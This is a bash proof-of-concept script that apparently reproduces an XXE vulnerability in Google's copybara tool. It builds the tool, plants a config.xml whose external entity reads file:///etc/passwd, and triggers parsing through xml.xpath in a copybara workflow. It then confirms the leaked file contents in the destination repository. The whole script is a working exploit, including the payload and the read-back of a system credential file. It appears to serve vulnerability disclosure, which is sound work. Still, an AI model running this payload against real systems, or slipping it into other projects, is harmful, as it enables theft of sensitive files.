#!/bin/bash
# E2E reproduction script for google/copybara XXE (XmlModule.java:55)
# Requires: Java 21+, Bazel (or pre-built copybara_deploy.jar), git
set -e

echo "=== Step 1: Build copybara from source ==="
if [ ! -f copybara_deploy.jar ]; then
    git clone --depth 1 https://github.com/google/copybara.git copybara-src
    cd copybara-src
    bazel build //java/com/google/copybara:copybara_deploy.jar \
        --java_language_version=21 --tool_java_language_version=21 \
        --java_runtime_version=local_jdk --jobs=2
    cp bazel-bin/java/com/google/copybara/copybara_deploy.jar ../
    cd ..
    echo "[+] Built copybara_deploy.jar"
else
    echo "[*] copybara_deploy.jar already exists, skipping build"
fi

echo ""
echo "=== Step 2: Create attacker source repo ==="
rm -rf /tmp/xxe-source-repo /tmp/xxe-dest-repo
mkdir -p /tmp/xxe-source-repo
cd /tmp/xxe-source-repo
git init
git config user.email "attacker@example.com"
git config user.name "Attacker"

# Place XXE payload in config.xml
cat > config.xml << 'XML'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<project>
  <name>malicious-project</name>
  <version>&xxe;</version>
</project>
XML

echo "# Normal Project" > README.md
git add . && git commit -m "Initial commit"
echo "[+] Source repo ready at /tmp/xxe-source-repo"

echo ""
echo "=== Step 3: Create destination repo ==="
git init --bare /tmp/xxe-dest-repo
echo "[+] Dest repo ready at /tmp/xxe-dest-repo"

echo ""
echo "=== Step 4: Write copybara config ==="
cat > /tmp/xxe-copy.bara.sky << 'SKY'
origin_url = "file:///tmp/xxe-source-repo"
destination_url = "file:///tmp/xxe-dest-repo"

def extract_version(ctx):
    xml_content = ctx.read_path(ctx.new_path("config.xml"))
    version = xml.xpath(
        content = xml_content,
        expression = "/project/version",
        type = "STRING",
    )
    ctx.console.info("Extracted version: " + version)
    ctx.write_path(ctx.new_path("VERSION.txt"), version)

core.workflow(
    name = "default",
    origin = git.origin(url = origin_url, ref = "master"),
    destination = git.destination(url = destination_url, fetch = "master", push = "master"),
    authoring = authoring.pass_thru("CI Bot <ci@company.com>"),
    transformations = [core.dynamic_transform(extract_version)],
)
SKY
echo "[+] Config written to /tmp/xxe-copy.bara.sky"

echo ""
echo "=== Step 5: Run copybara — XXE triggers here ==="
cd /tmp
java -jar "$OLDPWD/copybara_deploy.jar" migrate xxe-copy.bara.sky --force 2>&1

echo ""
echo "=== Step 6: Verify exfiltrated data ==="
TMPDIR=$(mktemp -d)
git clone /tmp/xxe-dest-repo "$TMPDIR" 2>/dev/null
echo "[+] VERSION.txt in destination repo contains:"
cat "$TMPDIR/VERSION.txt"
rm -rf "$TMPDIR"

echo ""
echo "=== XXE CONFIRMED ==="
echo "file:///etc/passwd content was exfiltrated via xml.xpath() in copybara"
